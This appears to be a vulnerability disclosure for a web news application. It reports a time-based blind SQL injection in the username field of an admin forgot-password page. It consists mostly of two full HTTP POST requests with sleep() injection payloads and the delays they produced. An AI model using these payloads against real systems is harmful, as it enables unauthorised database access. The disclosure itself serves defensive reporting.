BUG_Author:PEOIzEve

Vulnerability File: /101news/admin/forgot-password.php

POST parameter 'username' exists SQL injection vulnerability

Payload1:username=a' and (select 1 from (select(sleep(10)))a) AND 'a'='a&email=b&confirmpassword=c&newpassword=d&submit=

```
POST /101news/admin/forgot-password.php HTTP/1.1
Host: localhost
Content-Length: 111
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/101news/admin/forgot-password.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=k7m8rkajvoev3rcu6g7qup0660
Connection: close

username=a' and (select 1 from (select(sleep(10)))a) AND 'a'='a&email=b&confirmpassword=c&newpassword=d&submit=
```

The server's response time is 10 seconds

![image](https://github.com/PEOIzEve/bug_report/blob/main/sql1.png)

Payload2:username=a' and (select 1 from (select(sleep(15)))a) AND 'a'='a&email=b&confirmpassword=c&newpassword=d&submit=

```
POST /101news/admin/forgot-password.php HTTP/1.1
Host: localhost
Content-Length: 111
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/101news/admin/forgot-password.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=k7m8rkajvoev3rcu6g7qup0660
Connection: close

username=a' and (select 1 from (select(sleep(15)))a) AND 'a'='a&email=b&confirmpassword=c&newpassword=d&submit=
```

The server's response time is 15 seconds

![image](https://github.com/PEOIzEve/bug_report/blob/main/sql2.png)
